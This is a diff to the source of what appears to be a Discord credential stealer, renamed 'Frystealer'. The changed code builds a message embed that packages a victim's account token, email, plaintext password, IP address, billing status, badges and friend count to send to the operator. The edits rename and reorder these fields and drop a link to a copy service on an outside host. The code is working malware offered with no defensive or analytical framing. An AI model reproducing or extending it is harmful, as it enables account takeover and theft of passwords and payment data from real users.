@@ -609,38 +609,48 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:944007295417843743:959785231982931979> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            name: 'IP',
+            value: `\`${config.ip}\``,
             inline: false,
           },
           {
-            name: '<a:satanist:802503618972483615> Badges:',
+            name: 'Username',
+            value: `\`${json.username}\``,
+            inline: false,
+          },
+          {  
+            name: 'ID',
+            value: `${json.id}`,
+            inline: true,
+          },
+          {  
+            name: 'Badges',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
+            name: 'Billing',
             value: `**${billing}**`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Friends:',
+            name: 'Friends Total',
             value: `\`${friends}\``,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Email:',
+            name: 'Email',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> IP:',
-            value: `\`${config.ip}\``,
+            name: 'Password',
+            value: `\`${password}\``,
             inline: true,
           },
           {
-            name: '<a:satan:846706207632261120> Password:',
-            value: `\`${password}\``,
+            name: 'Token',
+            value: `\`${token}\``,
             inline: true,
           },
         ],
@@ -649,7 +659,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'BulkFA',
+          text: 'Frystealer',
         },
         thumbnail: {
           url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
